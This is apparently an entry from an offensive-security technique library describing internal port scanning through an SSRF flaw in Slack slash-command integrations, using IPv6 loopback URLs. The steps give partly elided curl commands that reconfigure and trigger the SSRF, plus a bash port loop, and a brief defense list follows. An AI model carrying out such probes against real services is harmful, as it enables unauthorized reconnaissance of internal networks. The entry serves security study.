---
tags:
  - ssrf
  - ipv6
  - recon
  - port-scan
type: procedure
tools: []
tactics:
  - '[[Reconnaissance]]'
commands:
  - '[[commands/configure-slack-ssrf-slash-command]]'
  - '[[commands/execute-slack-ssrf-command]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
updated_at: '2025-12-14T04:08:48.357Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 9adff11c-6380-4101-9c6b-5c20ea9522bb
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
---
# Scan-Internal-Services-via-SSRF-Vector

## Summary

This procedure uses the established SSRF vector in Slack integrations to probe multiple internal ports (e.g., 3128 for Squid), identifying open services through response analysis for broader reconnaissance.

## Description

By iteratively configuring and executing slash commands or Phabricator updates with different ports in the IPv6 URL, attackers can scan the loopback interface. Responses vary: banners for open ports, errors for closed. This reveals internal tech stack like Squid proxies.

## Requirements

1. Working SSRF vector from prior steps
2. List of target ports (e.g., common services: 22, 25, 80, 3128)
3. Automation script for iteration if manual testing is slow

## Defense

Defensive measures and detection strategies:

- Implement port-specific allowlisting in backend fetches
- Log all internal connection attempts from app servers
- Use WAF rules to block IPv6 loopback in user inputs

## Objectives

1. Probe ports like 3128 for Squid access
2. Collect service banners and errors
3. Map internal network resources

## Instructions

### Step 1: Reconfigure for New Port

**Context**: Update slash command URL to target port 3128.

**Command** ([[commands/configure-slack-ssrf-slash-command]]):
```bash
curl -X POST https://agarri.slack.com/services/4814366410 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "crumb=...&edit_service=1&is_edit=1&command=/ssrf&url=http://[::]:3128/&method=GET&..."
```

> Confirm update, then proceed to execution.

### Step 2: Execute and Analyze

**Context**: Trigger SSRF and capture response.

**Command** ([[commands/execute-slack-ssrf-command]]):
```bash
curl -X POST https://agarri.slack.com/api/chat.command?...&command=/ssrf
```

> Expected: Squid error page in response, confirming proxy access. Repeat for other ports.

### Step 3: Iterate Ports

**Context**: Script or manually test ports 1-1024, noting 200/302 for open, 500/timeout for closed.

**Command** (Example loop in bash):
```bash
for port in 22 25 80 3128; do
  # Reconfig and exec, parse response
  echo "Port $port: $(curl ... | grep banner)"
done
```

> Build a service map from outputs.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Active Scanning]]

### Sub-Techniques

- None

## Commands Used

- [[commands/configure-slack-ssrf-slash-command]]
- [[commands/execute-slack-ssrf-command]]

## Tools Used

- None

## Tags

- [[ssrf]]
- [[recon]]
- [[port-scan]]
